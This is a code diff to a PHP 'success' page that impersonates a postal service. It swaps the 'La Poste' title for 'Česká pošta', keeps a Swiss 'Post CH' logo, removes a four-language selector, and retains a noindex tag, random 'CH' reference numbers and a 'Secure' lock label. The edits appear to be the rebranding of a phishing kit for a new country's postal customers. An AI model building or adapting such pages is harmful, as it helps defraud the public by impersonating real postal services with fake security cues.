@@ -24,7 +24,7 @@ $ref_number = 'CH' . mt_rand(100000000, 999999999) . 'CH';
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="robots" content="noindex">
-    <title><?= t('success_title') ?> | La Poste</title>
+    <title><?= t('success_title') ?> | Česká pošta</title>
     <link rel="icon" type="image/x-icon" href="assets/favicon.ico">
     <link rel="stylesheet" href="assets/post-branding.css?v=<?= time() ?>">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -97,38 +97,7 @@ $ref_number = 'CH' . mt_rand(100000000, 999999999) . 'CH';
             gap: 15px;
         }
 
-        /* Language Selector Styles */
-        .lang-selector {
-            display: flex;
-            gap: 12px;
-            margin-right: 25px;
-            font-size: 13px;
-            font-weight: 500;
-            padding-right: 25px;
-            border-right: 1px solid #e0e0e0;
-        }
-        .lang-selector a {
-            text-decoration: none;
-            color: #666;
-            transition: all 0.2s;
-        }
-        .lang-selector a:hover {
-            color: #000;
-        }
-        .lang-selector a.active {
-            color: #111;
-            font-weight: 700;
-            text-decoration: underline;
-        }
-        
-        @media (max-width: 480px) {
-            .lang-selector {
-                margin-right: 15px;
-                padding-right: 15px;
-                gap: 8px;
-                font-size: 12px;
-            }
-        }
+
         /* GLOBAL LAYOUT FIX */
         html {
             height: 100%;
@@ -184,12 +153,6 @@ $ref_number = 'CH' . mt_rand(100000000, 999999999) . 'CH';
                 <img src="assets/POST.svg" alt="Post CH" class="post-logo">
             </div>
             <div class="header-right">
-                <div class="lang-selector">
-                    <a href="?lang=de" class="<?= $current_lang == 'de' ? 'active' : '' ?>">DE</a>
-                    <a href="?lang=fr" class="<?= $current_lang == 'fr' ? 'active' : '' ?>">FR</a>
-                    <a href="?lang=it" class="<?= $current_lang == 'it' ? 'active' : '' ?>">IT</a>
-                    <a href="?lang=en" class="<?= $current_lang == 'en' ? 'active' : '' ?>">EN</a>
-                </div>
                 <div class="login-text">
                     <img src="assets/lock.svg" alt="Secure" class="lock-icon">
                     <span><?= t('secure_conn') ?></span>
